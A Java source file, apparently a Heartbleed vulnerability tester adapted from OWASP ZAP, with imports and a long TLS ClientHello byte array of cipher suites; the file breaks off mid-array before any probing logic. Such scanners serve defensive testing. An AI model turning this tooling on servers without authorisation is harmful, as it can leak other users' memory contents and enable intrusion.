package net.continuumsecurity.utils;

import net.continuumsecurity.utils.TestResult;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.util.logging.Logger;

/**
 * Code ripped from an OWASP ZAP proxy, license below
 *
 * ZAP Attack Proxy (ZAP) and its related class files.
 *
 * ZAP is an HTTP/HTTPS proxy for assessing web application security.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

public class HeartBleedTester {

    Logger log = Logger.getLogger(HeartBleedTester.class.toString());

    public static final byte handshakeRecordBuffer[] = {0x16};

    static final String [] tlsNames =     { "TLS 1.0",   "TLS 1.1",    "TLS 1.2"};
    static final byte [] [] tlsBuffers = {{0x03, 0x01}, {0x03, 0x02}, {0x03, 0x03}};
    static final byte [] helloBuffer = {
            (byte)0x53, (byte)0x43, (byte)0x5b, (byte)0x90, (byte)0x9d, (byte)0x9b, (byte)0x72, (byte)0x0b, (byte)0xbc,  (byte)0x0c, (byte)0xbc, (byte)0x2b, (byte)0x92, (byte)0xa8, (byte)0x48, (byte)0x97,
            (byte)0xcf, (byte)0xbd, (byte)0x39, (byte)0x04, (byte)0xcc, (byte)0x16, (byte)0x0a, (byte)0x85, (byte)0x03,  (byte)0x90, (byte)0x9f, (byte)0x77, (byte)0x04, (byte)0x33, (byte)0xd4, (byte)0xde,
            (byte)0x00,

                /*
                //for the original implementation..
                (byte)0x00, (byte)0x66, //Cipher suites length
                                                                //followed by the cipher suites
                (byte)0xc0, (byte)0x14, (byte)0xc0, (byte)0x0a, (byte)0xc0, (byte)0x22,  (byte)0xc0, (byte)0x21, (byte)0x00, (byte)0x39, (byte)0x00, (byte)0x38, (byte)0x00, (byte)0x88, (byte)0x00, (byte)0x87,
                (byte)0xc0, (byte)0x0f, (byte)0xc0, (byte)0x05, (byte)0x00, (byte)0x35,  (byte)0x00, (byte)0x84, (byte)0xc0, (byte)0x12, (byte)0xc0, (byte)0x08, (byte)0xc0, (byte)0x1c, (byte)0xc0, (byte)0x1b,
                (byte)0x00, (byte)0x16, (byte)0x00, (byte)0x13, (byte)0xc0, (byte)0x0d,  (byte)0xc0, (byte)0x03, (byte)0x00, (byte)0x0a, (byte)0xc0, (byte)0x13, (byte)0xc0, (byte)0x09, (byte)0xc0, (byte)0x1f,
                (byte)0xc0, (byte)0x1e, (byte)0x00, (byte)0x33, (byte)0x00, (byte)0x32,  (byte)0x00, (byte)0x9a, (byte)0x00, (byte)0x99, (byte)0x00, (byte)0x45, (byte)0x00, (byte)0x44, (byte)0xc0, (byte)0x0e,
                (byte)0xc0, (byte)0x04, (byte)0x00, (byte)0x2f, (byte)0x00, (byte)0x96,  (byte)0x00, (byte)0x41, (byte)0xc0, (byte)0x11, (byte)0xc0, (byte)0x07, (byte)0xc0, (byte)0x0c, (byte)0xc0, (byte)0x02,
                (byte)0x00, (byte)0x05, (byte)0x00, (byte)0x04, (byte)0x00, (byte)0x15,  (byte)0x00, (byte)0x12, (byte)0x00, (byte)0x09, (byte)0x00, (byte)0x14, (byte)0x00, (byte)0x11, (byte)0x00, (byte)0x08,
                (byte)0x00, (byte)0x06, (byte)0x00, (byte)0x03, (byte)0x00, (byte)0xff,
                */

            0x02,0x7C, //Cipher suites length: 636 bytes of data
            //followed by the individual cipher suites that we say we support. Ha!
            0x00,0x00, //TLS_NULL_WITH_NULL_NULL
            0x00,0x01, //TLS_RSA_WITH_NULL_MD5
            0x00,0x02, //TLS_RSA_WITH_NULL_SHA
            0x00,0x03, //TLS_RSA_EXPORT_WITH_RC4_40_MD5
            0x00,0x04, //TLS_RSA_WITH_RC4_128_MD5
            0x00,0x05, //TLS_RSA_WITH_RC4_128_SHA
            0x00,0x06, //TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5
            0x00,0x07, //TLS_RSA_WITH_IDEA_CBC_SHA
            0x00,0x08, //TLS_RSA_EXPORT_WITH_DES40_CBC_SHA
            0x00,0x09, //TLS_RSA_WITH_DES_CBC_SHA
            0x00,0x0A, //TLS_RSA_WITH_3DES_EDE_CBC_SHA
            0x00,0x0B, //TLS_DH_DSS_EXPORT_WITH_DES40_CBC_SHA
            0x00,0x0C, //TLS_DH_DSS_WITH_DES_CBC_SHA
            0x00,0x0D, //TLS_DH_DSS_WITH_3DES_EDE_CBC_SHA
            0x00,0x0E, //TLS_DH_RSA_EXPORT_WITH_DES40_CBC_SHA
            0x00,0x0F, //TLS_DH_RSA_WITH_DES_CBC_SHA
            0x00,0x10, //TLS_DH_RSA_WITH_3DES_EDE_CBC_SHA
            0x00,0x11, //TLS_DHE_DSS_EXPORT_WITH_DES40_CBC_SHA
            0x00,0x12, //TLS_DHE_DSS_WITH_DES_CBC_SHA
            0x00,0x13, //TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA
            0x00,0x14, //TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
            0x00,0x15, //TLS_DHE_RSA_WITH_DES_CBC_SHA
            0x00,0x16, //TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
            0x00,0x17, //TLS_DH_anon_EXPORT_WITH_RC4_40_MD5
            0x00,0x18, //TLS_DH_anon_WITH_RC4_128_MD5
            0x00,0x19, //TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA
            0x00,0x1A, //TLS_DH_anon_WITH_DES_CBC_SHA
            0x00,0x1B, //TLS_DH_anon_WITH_3DES_EDE_CBC_SHA
            0x00,0x1E, //TLS_KRB5_WITH_DES_CBC_SHA
            0x00,0x1F, //TLS_KRB5_WITH_3DES_EDE_CBC_SHA
            0x00,0x20, //TLS_KRB5_WITH_RC4_128_SHA
            0x00,0x21, //TLS_KRB5_WITH_IDEA_CBC_SHA
            0x00,0x22, //TLS_KRB5_WITH_DES_CBC_MD5
            0x00,0x23, //TLS_KRB5_WITH_3DES_EDE_CBC_MD5
            0x00,0x24, //TLS_KRB5_WITH_RC4_128_MD5
            0x00,0x25, //TLS_KRB5_WITH_IDEA_CBC_MD5
            0x00,0x26, //TLS_KRB5_EXPORT_WITH_DES_CBC_40_SHA
            0x00,0x27, //TLS_KRB5_EXPORT_WITH_RC2_CBC_40_SHA
            0x00,0x28, //TLS_KRB5_EXPORT_WITH_RC4_40_SHA
            0x00,0x29, //TLS_KRB5_EXPORT_WITH_DES_CBC_40_MD5
            0x00,0x2A, //TLS_KRB5_EXPORT_WITH_RC2_CBC_40_MD5
            0x00,0x2B, //TLS_KRB5_EXPORT_WITH_RC4_40_MD5
            0x00,0x2C, //TLS_PSK_WITH_NULL_SHA
            0x00,0x2D, //TLS_DHE_PSK_WITH_NULL_SHA
            0x00,0x2E, //TLS_RSA_PSK_WITH_NULL_SHA
            0x00,0x2F, //TLS_RSA_WITH_AES_128_CBC_SHA
            0x00,0x30, //TLS_DH_DSS_WITH_AES_128_CBC_SHA
            0x00,0x31, //TLS_DH_RSA_WITH_AES_128_CBC_SHA
            0x00,0x32, //TLS_DHE_DSS_WITH_AES_128_CBC_SHA
            0x00,0x33, //TLS_DHE_RSA_WITH_AES_128_CBC_SHA
            0x00,0x34, //TLS_DH_anon_WITH_AES_128_CBC_SHA
            0x00,0x35, //TLS_RSA_WITH_AES_256_CBC_SHA
            0x00,0x36, //TLS_DH_DSS_WITH_AES_256_CBC_SHA
            0x00,0x37, //TLS_DH_RSA_WITH_AES_256_CBC_SHA
            0x00,0x38, //TLS_DHE_DSS_WITH_AES_256_CBC_SHA
            0x00,0x39, //TLS_DHE_RSA_WITH_AES_256_CBC_SHA
            0x00,0x3A, //TLS_DH_anon_WITH_AES_256_CBC_SHA
            0x00,0x3B, //TLS_RSA_WITH_NULL_SHA256
            0x00,0x3C, //TLS_RSA_WITH_AES_128_CBC_SHA256
            0x00,0x3D, //TLS_RSA_WITH_AES_256_CBC_SHA256
            0x00,0x3E, //TLS_DH_DSS_WITH_AES_128_CBC_SHA256
            0x00,0x3F, //TLS_DH_RSA_WITH_AES_128_CBC_SHA256
            0x00,0x40, //TLS_DHE_DSS_WITH_AES_128_CBC_SHA256
            0x00,0x41, //TLS_RSA_WITH_CAMELLIA_128_CBC_SHA
            0x00,0x42, //TLS_DH_DSS_WITH_CAMELLIA_128_CBC_SHA
            0x00,0x43, //TLS_DH_RSA_WITH_CAMELLIA_128_CBC_SHA
            0x00,0x44, //TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA
            0x00,0x45, //TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA
            0x00,0x46, //TLS_DH_anon_WITH_CAMELLIA_128_CBC_SHA
            0x00,0x67, //TLS_DHE_RSA_WITH_AES_128_CBC_SHA256
            0x00,0x68, //TLS_DH_DSS_WITH_AES_256_CBC_SHA256
            0x00,0x69, //TLS_DH_RSA_WITH_AES_256_CBC_SHA256
            0x00,0x6A, //TLS_DHE_DSS_WITH_AES_256_CBC_SHA256
            0x00,0x6B, //TLS_DHE_RSA_WITH_AES_256_CBC_SHA256
            0x00,0x6C, //TLS_DH_anon_WITH_AES_128_CBC_SHA256
            0x00,0x6D, //TLS_DH_anon_WITH_AES_256_CBC_SHA256
            0x00,(byte)0x84, //TLS_RSA_WITH_CAMELLIA_256_CBC_SHA
            0x00,(byte)0x85, //TLS_DH_DSS_WITH_CAMELLIA_256_CBC_SHA
            0x00,(byte)0x86, //TLS_DH_RSA_WITH_CAMELLIA_256_CBC_SHA
            0x00,(byte)0x87, //TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA
            0x00,(byte)0x88, //TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA
            0x00,(byte)0x89, //TLS_DH_anon_WITH_CAMELLIA_256_CBC_SHA
            0x00,(byte)0x8A, //TLS_PSK_WITH_RC4_128_SHA
            0x00,(byte)0x8B, //TLS_PSK_WITH_3DES_EDE_CBC_SHA
            0x00,(byte)0x8C, //TLS_PSK_WITH_AES_128_CBC_SHA
            0x00,(byte)0x8D, //TLS_PSK_WITH_AES_256_CBC_SHA
            0x00,(byte)0x8E, //TLS_DHE_PSK_WITH_RC4_128_SHA
            0x00,(byte)0x8F, //TLS_DHE_PSK_WITH_3DES_EDE_CBC_SHA
            0x00,(byte)0x90, //TLS_DHE_PSK_WITH_AES_128_CBC_SHA
            0x00,(byte)0x91, //TLS_DHE_PSK_WITH_AES_256_CBC_SHA
            0x00,(byte)0x92, //TLS_RSA_PSK_WITH_RC4_128_SHA
            0x00,(byte)0x93, //TLS_RSA_PSK_WITH_3DES_EDE_CBC_SHA
            0x00,(byte)0x94, //TLS_RSA_PSK_WITH_AES_128_CBC_SHA
            0x00,(byte)0x95, //TLS_RSA_PSK_WITH_AES_256_CBC_SHA
            0x00,(byte)0x96, //TLS_RSA_WITH_SEED_CBC_SHA
            0x00,(byte)0x97, //TLS_DH_DSS_WITH_SEED_CBC_SHA
            0x00,(byte)0x98, //TLS_DH_RSA_WITH_SEED_CBC_SHA
            0x00,(byte)0x99, //TLS_DHE_DSS_WITH_SEED_CBC_SHA
            0x00,(byte)0x9A, //TLS_DHE_RSA_WITH_SEED_CBC_SHA
            0x00,(byte)0x9B, //TLS_DH_anon_WITH_SEED_CBC_SHA
            0x00,(byte)0x9C, //TLS_RSA_WITH_AES_128_GCM_SHA256
            0x00,(byte)0x9D, //TLS_RSA_WITH_AES_256_GCM_SHA384
            0x00,(byte)0x9E, //TLS_DHE_RSA_WITH_AES_128_GCM_SHA256
            0x00,(byte)0x9F, //TLS_DHE_RSA_WITH_AES_256_GCM_SHA384
            0x00,(byte)0xA0, //TLS_DH_RSA_WITH_AES_128_GCM_SHA256
            0x00,(byte)0xA1, //TLS_DH_RSA_WITH_AES_256_GCM_SHA384
            0x00,(byte)0xA2, //TLS_DHE_DSS_WITH_AES_128_GCM_SHA256
            0x00,(byte)0xA3, //TLS_DHE_DSS_WITH_AES_256_GCM_SHA384
            0x00,(byte)0xA4, //TLS_DH_DSS_WITH_AES_128_GCM_SHA256
            0x00,(byte)0xA5, //TLS_DH_DSS_WITH_AES_256_GCM_SHA384
            0x00,(byte)0xA6, //TLS_DH_anon_WITH_AES_128_GCM_SHA256
            0x00,(byte)0xA7, //TLS_DH_anon_WITH_AES_256_GCM_SHA384
            0x00,(byte)0xA8, //TLS_PSK_WITH_AES_128_GCM_SHA256
            0x00,(byte)0xA9, //TLS_PSK_WITH_AES_256_GCM_SHA384
            0x00,(byte)0xAA, //TLS_DHE_PSK_WITH_AES_128_GCM_SHA256
            0x00,(byte)0xAB, //TLS_DHE_PSK_WITH_AES_256_GCM_SHA384
            0x00,(byte)0xAC, //TLS_RSA_PSK_WITH_AES_128_GCM_SHA256
            0x00,(byte)0xAD, //TLS_RSA_PSK_WITH_AES_256_GCM_SHA384
            0x00,(byte)0xAE, //TLS_PSK_WITH_AES_128_CBC_SHA256
            0x00,(byte)0xAF, //TLS_PSK_WITH_AES_256_CBC_SHA384
            0x00,(byte)0xB0, //TLS_PSK_WITH_NULL_SHA256
            0x00,(byte)0xB1, //TLS_PSK_WITH_NULL_SHA384
            0x00,(byte)0xB2, //TLS_DHE_PSK_WITH_AES_128_CBC_SHA256
            0x00,(byte)0xB3, //TLS_DHE_PSK_WITH_AES_256_CBC_SHA384
            0x00,(byte)0xB4, //TLS_DHE_PSK_WITH_NULL_SHA256
            0x00,(byte)0xB5, //TLS_DHE_PSK_WITH_NULL_SHA384
            0x00,(byte)0xB6, //TLS_RSA_PSK_WITH_AES_128_CBC_SHA256
            0x00,(byte)0xB7, //TLS_RSA_PSK_WITH_AES_256_CBC_SHA384
            0x00,(byte)0xB8, //TLS_RSA_PSK_WITH_NULL_SHA256
            0x00,(byte)0xB9, //TLS_RSA_PSK_WITH_NULL_SHA384
            0x00,(byte)0xBA, //TLS_RSA_WITH_CAMELLIA_128_CBC_SHA256
            0x00,(byte)0xBB, //TLS_DH_DSS_WITH_CAMELLIA_128_CBC_SHA256
            0x00,(byte)0xBC, //TLS_DH_RSA_WITH_CAMELLIA_128_CBC_SHA256
            0x00,(byte)0xBD, //TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA256
            0x00,(byte)0xBE, //TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA256
            0x00,(byte)0xBF, //TLS_DH_anon_WITH_CAMELLIA_128_CBC_SHA256
            0x00,(byte)0xC0, //TLS_RSA_WITH_CAMELLIA_256_CBC_SHA256
            0x00,(byte)0xC1, //TLS_DH_DSS_WITH_CAMELLIA_256_CBC_SHA256
            0x00,(byte)0xC2, //TLS_DH_RSA_WITH_CAMELLIA_256_CBC_SHA256
            0x00,(byte)0xC3, //TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA256
            0x00,(byte)0xC4, //TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA256
            0x00,(byte)0xC5, //TLS_DH_anon_WITH_CAMELLIA_256_CBC_SHA256
            (byte)0xC0,0x01, //TLS_ECDH_ECDSA_WITH_NULL_SHA
            (byte)0xC0,0x02, //TLS_ECDH_ECDSA_WITH_RC4_128_SHA
            (byte)0xC0,0x03, //TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA
            (byte)0xC0,0x04, //TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA
            (byte)0xC0,0x05, //TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA
            (byte)0xC0,0x06, //TLS_ECDHE_ECDSA_WITH_NULL_SHA
            (byte)0xC0,0x07, //TLS_ECDHE_ECDSA_WITH_RC4_128_SHA
            (byte)0xC0,0x08, //TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA
            (byte)0xC0,0x09, //TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA
            (byte)0xC0,0x0A, //TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA
            (byte)0xC0,0x0B, //TLS_ECDH_RSA_WITH_NULL_SHA
            (byte)0xC0,0x0C, //TLS_ECDH_RSA_WITH_RC4_128_SHA
            (byte)0xC0,0x0D, //TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA
            (byte)0xC0,0x0E, //TLS_ECDH_RSA_WITH_AES_128_CBC_SHA
            (byte)0xC0,0x0F, //TLS_ECDH_RSA_WITH_AES_256_CBC_SHA
            (byte)0xC0,0x10, //TLS_ECDHE_RSA_WITH_NULL_SHA
            (byte)0xC0,0x11, //TLS_ECDHE_RSA_WITH_RC4_128_SHA
            (byte)0xC0,0x12, //TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA
            (byte)0xC0,0x13, //TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA
            (byte)0xC0,0x14, //TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA
            (byte)0xC0,0x15, //TLS_ECDH_anon_WITH_NULL_SHA
            (byte)0xC0,0x16, //TLS_ECDH_anon_WITH_RC4_128_SHA
            (byte)0xC0,0x17, //TLS_ECDH_anon_WITH_3DES_EDE_CBC_SHA
            (byte)0xC0,0x18, //TLS_ECDH_anon_WITH_AES_128_CBC_SHA
            (byte)0xC0,0x19, //TLS_ECDH_anon_WITH_AES_256_CBC_SHA
            (byte)0xC0,0x1A, //TLS_SRP_SHA_WITH_3DES_EDE_CBC_SHA
            (byte)0xC0,0x1B, //TLS_SRP_SHA_RSA_WITH_3DES_EDE_CBC_SHA
            (byte)0xC0,0x1C, //TLS_SRP_SHA_DSS_WITH_3DES_EDE_CBC_SHA
            (byte)0xC0,0x1D, //TLS_SRP_SHA_WITH_AES_128_CBC_SHA
            (byte)0xC0,0x1E, //TLS_SRP_SHA_RSA_WITH_AES_128_CBC_SHA
            (byte)0xC0,0x1F, //TLS_SRP_SHA_DSS_WITH_AES_128_CBC_SHA
            (byte)0xC0,0x20, //TLS_SRP_SHA_WITH_AES_256_CBC_SHA
            (byte)0xC0,0x21, //TLS_SRP_SHA_RSA_WITH_AES_256_CBC_SHA
            (byte)0xC0,0x22, //TLS_SRP_SHA_DSS_WITH_AES_256_CBC_SHA
            (byte)0xC0,0x23, //TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256
            (byte)0xC0,0x24, //TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384
            (byte)0xC0,0x25, //TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA256
            (byte)0xC0,0x26, //TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA384
            (byte)0xC0,0x27, //TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256
            (byte)0xC0,0x28, //TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384
            (byte)0xC0,0x29, //TLS_ECDH_RSA_WITH_AES_128_CBC_SHA256
            (byte)0xC0,0x2A, //TLS_ECDH_RSA_WITH_AES_256_CBC_SHA384
            (byte)0xC0,0x2B, //TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256
            (byte)0xC0,0x2C, //TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384
            (byte)0xC0,0x2D, //TLS_ECDH_ECDSA_WITH_AES_128_GCM_SHA256
            (byte)0xC0,0x2E, //TLS_ECDH_ECDSA_WITH_AES_256_GCM_SHA384
            (byte)0xC0,0x2F, //TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
            (byte)0xC0,0x30, //TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
            (byte)0xC0,0x31, //TLS_ECDH_RSA_WITH_AES_128_GCM_SHA256
            (byte)0xC0,0x32, //TLS_ECDH_RSA_WITH_AES_256_GCM_SHA384
            (byte)0xC0,0x33, //TLS_ECDHE_PSK_WITH_RC4_128_SHA
            (byte)0xC0,0x34, //TLS_ECDHE_PSK_WITH_3DES_EDE_CBC_SHA
            (byte)0xC0,0x35, //TLS_ECDHE_PSK_WITH_AES_128_CBC_SHA
            (byte)0xC0,0x36, //TLS_ECDHE_PSK_WITH_AES_256_CBC_SHA
            (byte)0xC0,0x37, //TLS_ECDHE_PSK_WITH_AES_128_CBC_SHA256
            (byte)0xC0,0x38, //TLS_ECDHE_PSK_WITH_AES_256_CBC_SHA384
            (byte)0xC0,0x39, //TLS_ECDHE_PSK_WITH_NULL_SHA
            (byte)0xC0,0x3A, //TLS_ECDHE_PSK_WITH_NULL_SHA256
            (byte)0xC0,0x3B, //TLS_ECDHE_PSK_WITH_NULL_SHA384
            (byte)0xC0,0x3C, //TLS_RSA_WITH_ARIA_128_CBC_SHA256
            (byte)0xC0,0x3D, //TLS_RSA_WITH_ARIA_256_CBC_SHA384
            (byte)0xC0,0x3E, //TLS_DH_DSS_WITH_ARIA_128_CBC_SHA256
            (byte)0xC0,0x3F, //TLS_DH_DSS_WITH_ARIA_256_CBC_SHA384
            (byte)0xC0,0x40, //TLS_DH_RSA_WITH_ARIA_128_CBC_SHA256
            (byte)0xC0,0x41, //TLS_DH_RSA_WITH_ARIA_256_CBC_SHA384
            (byte)0xC0,0x42, //TLS_DHE_DSS_WITH_ARIA_128_CBC_SHA256
            (byte)0xC0,0x43, //TLS_DHE_DSS_WITH_ARIA_256_CBC_SHA384
            (byte)0xC0,0x44, //TLS_DHE_RSA_WITH_ARIA_128_CBC_SHA256
            (byte)0xC0,0x45, //TLS_DHE_RSA_WITH_ARIA_256_CBC_SHA384
            (byte)0xC0,0x46, //TLS_DH_anon_WITH_ARIA_128_CBC_SHA256
            (byte)0xC0,0x47, //TLS_DH_anon_WITH_ARIA_256_CBC_SHA384
            (byte)0xC0,0x48, //TLS_ECDHE_ECDSA_WITH_ARIA_128_CBC_SHA256
            (byte)0xC0,0x49, //TLS_ECDHE_ECDSA_WITH_ARIA_256_CBC_SHA384
            (byte)0xC0,0x4A, //TLS_ECDH_ECDSA_WITH_ARIA_128_CBC_SHA256
            (byte)0xC0,0x4B, //TLS_ECDH_ECDSA_WITH_ARIA_256_CBC_SHA384
            (byte)0xC0,0x4C, //TLS_ECDHE_RSA_WITH_ARIA_128_CBC_SHA256
            (byte)0xC0,0x4D, //TLS_ECDHE_RSA_WITH_ARIA_256_CBC_SHA384
            (byte)0xC0,0x4E, //TLS_ECDH_RSA_WITH_ARIA_128_CBC_SHA256
            (byte)0xC0,0x4F, //TLS_ECDH_RSA_WITH_ARIA_256_CBC_SHA384
            (byte)0xC0,0x50, //TLS_RSA_WITH_ARIA_128_GCM_SHA256
            (byte)0xC0,0x51, //TLS_RSA_WITH_ARIA_256_GCM_SHA384
            (byte)0xC0,0x52, //TLS_DHE_RSA_WITH_ARIA_128_GCM_SHA256
            (byte)0xC0,0x53, //TLS_DHE_RSA_WITH_ARIA_256_GCM_SHA384
            (byte)0xC0,0x54, //TLS_DH_RSA_WITH_ARIA_128_GCM_SHA256
            (byte)0xC0,0x55, //TLS_DH_RSA_WITH_ARIA_256_GCM_SHA384
            (byte)0xC0,0x56, //TLS_DHE_DSS_WITH_ARIA_128_GCM_SHA256
            (byte)0xC0,0x57, //TLS_DHE_DSS_WITH_ARIA_256_GCM_SHA384
            (byte)0xC0,0x58, //TLS_DH_DSS_WITH_ARIA_128_GCM_SHA256
            (byte)0xC0,0x59, //TLS_DH_DSS_WITH_ARIA_256_GCM_SHA384
            (byte)0xC0,0x5A, //TLS_DH_anon_WITH_ARIA_128_GCM_SHA256
            (byte)0xC0,0x5B, //TLS_DH_anon_WITH_ARIA_256_GCM_SHA384
            (byte)0xC0,0x5C, //TLS_ECDHE_ECDSA_WITH_ARIA_128_GCM_SHA256
            (byte)0xC0,0x5D, //TLS_ECDHE_ECDSA_WITH_ARIA_256_GCM_SHA384
            (byte)0xC0,0x5E, //TLS_ECDH_ECDSA_WITH_ARIA_128_GCM_SHA256
            (byte)0xC0,0x5F, //TLS_ECDH_ECDSA_WITH_ARIA_256_GCM_SHA384
            (byte)0xC0,0x60, //TLS_ECDHE_RSA_WITH_ARIA_128_GCM_SHA256
            (byte)0xC0,0x61, //TLS_ECDHE_RSA_WITH_ARIA_256_GCM_SHA384
            (byte)0xC0,0x62, //TLS_ECDH_RSA_WITH_ARIA_128_GCM_SHA256
            (byte)0xC0,0x63, //TLS_ECDH_RSA_WITH_ARIA_256_GCM_SHA384
            (byte)0xC0,0x64, //TLS_PSK_WITH_ARIA_128_CBC_SHA256
            (byte)0xC0,0x65, //TLS_PSK_WITH_ARIA_256_CBC_SHA384
            (byte)0xC0,0x66, //TLS_DHE_PSK_WITH_ARIA_128_CBC_SHA256
            (byte)0xC0,0x67, //TLS_DHE_PSK_WITH_ARIA_256_CBC_SHA384
            (byte)0xC0,0x68, //TLS_RSA_PSK_WITH_ARIA_128_CBC_SHA256
            (byte)0xC0,0x69, //TLS_RSA_PSK_WITH_ARIA_256_CBC_SHA384
            (byte)0xC0,0x6A, //TLS_PSK_WITH_ARIA_128_GCM_SHA256
            (byte)0xC0,0x6B, //TLS_PSK_WITH_ARIA_256_GCM_SHA384
            (byte)0xC0,0x6C, //TLS_DHE_PSK_WITH_ARIA_128_GCM_SHA256
            (byte)0xC0,0x6D, //TLS_DHE_PSK_WITH_ARIA_256_GCM_SHA384
            (byte)0xC0,0x6E, //TLS_RSA_PSK_WITH_ARIA_128_GCM_SHA256
            (byte)0xC0,0x6F, //TLS_RSA_PSK_WITH_ARIA_256_GCM_SHA384
            (byte)0xC0,0x70, //TLS_ECDHE_PSK_WITH_ARIA_128_CBC_SHA256
            (byte)0xC0,0x71, //TLS_ECDHE_PSK_WITH_ARIA_256_CBC_SHA384
            (byte)0xC0,0x72, //TLS_ECDHE_ECDSA_WITH_CAMELLIA_128_CBC_SHA256
            (byte)0xC0,0x73, //TLS_ECDHE_ECDSA_WITH_CAMELLIA_256_CBC_SHA384
            (byte)0xC0,0x74, //TLS_ECDH_ECDSA_WITH_CAMELLIA_128_CBC_SHA256
            (byte)0xC0,0x75, //TLS_ECDH_ECDSA_WITH_CAMELLIA_256_CBC_SHA384
            (byte)0xC0,0x76, //TLS_ECDHE_RSA_WITH_CAMELLIA_128_CBC_SHA256
            (byte)0xC0,0x77, //TLS_ECDHE_RSA_WITH_CAMELLIA_256_CBC_SHA384
            (byte)0xC0,0x78, //TLS_ECDH_RSA_WITH_CAMELLIA_128_CBC_SHA256
            (byte)0xC0,0x79, //TLS_ECDH_RSA_WITH_CAMELLIA_256_CBC_SHA384
            (byte)0xC0,0x7A, //TLS_RSA_WITH_CAMELLIA_128_GCM_SHA256
            (byte)0xC0,0x7B, //TLS_RSA_WITH_CAMELLIA_256_GCM_SHA384
            (byte)0xC0,0x7C, //TLS_DHE_RSA_WITH_CAMELLIA_128_GCM_SHA256
            (byte)0xC0,0x7D, //TLS_DHE_RSA_WITH_CAMELLIA_256_GCM_SHA384
            (byte)0xC0,0x7E, //TLS_DH_RSA_WITH_CAMELLIA_128_GCM_SHA256
            (byte)0xC0,0x7F, //TLS_DH_RSA_WITH_CAMELLIA_256_GCM_SHA384
            (byte)0xC0,(byte)0x80, //TLS_DHE_DSS_WITH_CAMELLIA_128_GCM_SHA256
            (byte)0xC0,(byte)0x81, //TLS_DHE_DSS_WITH_CAMELLIA_256_GCM_SHA384
            (byte)0xC0,(byte)0x82, //TLS_DH_DSS_WITH_CAMELLIA_128_GCM_SHA256
            (byte)0xC0,(byte)0x83, //TLS_DH_DSS_WITH_CAMELLIA_256_GCM_SHA384
            (byte)0xC0,(byte)0x84, //TLS_DH_anon_WITH_CAMELLIA_128_GCM_SHA256
            (byte)0xC0,(byte)0x85, //TLS_DH_anon_WITH_CAMELLIA_256_GCM_SHA384
            (byte)0xC0,(byte)0x86, //TLS_ECDHE_ECDSA_WITH_CAMELLIA_128_GCM_SHA256
            (byte)0xC0,(byte)0x87, //TLS_ECDHE_ECDSA_WITH_CAMELLIA_256_GCM_SHA384
            (byte)0xC0,(byte)0x88, //TLS_ECDH_ECDSA_WITH_CAMELLIA_128_GCM_SHA256
            (byte)0xC0,(byte)0x89, //TLS_ECDH_ECDSA_WITH_CAMELLIA_256_GCM_SHA384
            (byte)0xC0,(byte)0x8A, //TLS_ECDHE_RSA_WITH_CAMELLIA_128_GCM_SHA256
            (byte)0xC0,(byte)0x8B, //TLS_ECDHE_RSA_WITH_CAMELLIA_256_GCM_SHA384
            (byte)0xC0,(byte)0x8C, //TLS_ECDH_RSA_WITH_CAMELLIA_128_GCM_SHA256
            (byte)0xC0,(byte)0x8D, //TLS_ECDH_RSA_WITH_CAMELLIA_256_GCM_SHA384
            (byte)0xC0,(byte)0x8E, //TLS_PSK_WITH_CAMELLIA_128_GCM_SHA256
            (byte)0xC0,(byte)0x8F, //TLS_PSK_WITH_CAMELLIA_256_GCM_SHA384
            (byte)0xC0,(byte)0x90, //TLS_DHE_PSK_WITH_CAMELLIA_128_GCM_SHA256
            (byte)0xC0,(byte)0x91, //TLS_DHE_PSK_WITH_CAMELLIA_256_GCM_SHA384
            (byte)0xC0,(byte)0x92, //TLS_RSA_PSK_WITH_CAMELLIA_128_GCM_SHA256
            (byte)0xC0,(byte)0x93, //TLS_RSA_PSK_WITH_CAMELLIA_256_GCM_SHA384
            (byte)0xC0,(byte)0x94, //TLS_PSK_WITH_CAMELLIA_128_CBC_SHA256
            (byte)0xC0,(byte)0x95, //TLS_PSK_WITH_CAMELLIA_256_CBC_SHA384
            (byte)0xC0,(byte)0x96, //TLS_DHE_PSK_WITH_CAMELLIA_128_CBC_SHA256
            (byte)0xC0,(byte)0x97, //TLS_DHE_PSK_WITH_CAMELLIA_256_CBC_SHA384
